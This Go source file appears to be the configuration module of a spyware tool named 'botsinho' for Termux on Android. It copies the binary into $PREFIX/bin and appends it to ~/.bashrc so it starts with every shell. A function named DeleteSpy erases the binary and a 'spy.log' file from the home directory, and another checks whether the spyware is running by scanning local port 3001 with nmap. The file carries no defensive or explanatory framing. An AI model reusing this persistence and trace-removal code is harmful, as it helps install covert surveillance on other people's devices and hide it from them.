package config

import (
	//"fmt"

	"fmt"
	"strings"

	"os/exec"
	"runtime"
	"time"
)



func Systm()string{

	sis := runtime.GOOS
	return sis
}

func ConfigTrmx()(bool){
	path := exec.Command("bash", "-c", "ls $PREFIX/bin|grep -w botsinho")
	
	
	out, _ := path.Output()
	fmt.Println("conf.,,,,>:"+string(out))

	if(string(out) == ""){
		fmt.Println("configurando...")
		com := exec.Command("bash", "-c", "cp botsinho $PREFIX/bin/")
		com.Output()
		exec.Command("bash", "-c", `echo 'botsinho' >> ~/.bashrc`).Start()
		time.Sleep(1 * time.Second)
		return true
		
	}else{

		fmt.Println(string(out))
		fmt.Println("OK")
		return true
	}
	
	
}




func DeleteSpy(){
	com := exec.Command("bash", "-c", "find ~/ -name botsinho -delete")
	com2 := exec.Command("bash", "-c", "find ~/ -name spy.log -delete")
	com2.Output()
	com.Output()

	
}

func IsRunSpyware()(bool, []string, int){
	// com := exec.Command("ps", "aux", "|", "grep", "-o", "botsinho")
	// out, _ := com.Output()
	// dat := strings.Split(strings.Replace(string(out), "\n", " ", 5), " ")
	dat := VerProceso()
	return len(dat)-2 > 1, dat, len(dat)
	


}
func VerProceso()[]string{
	exec.Command("bash", "-c", "apt install nmap > /dev/null 2>&1")
	com := exec.Command("bash", "-c", "nmap -p 3001 localhost | grep -o open" )
	w, _ := com.Output()
	w = []byte(strings.ReplaceAll(string(w), "\n", " "))
	e := strings.Split(string(w), " ")
	return e
}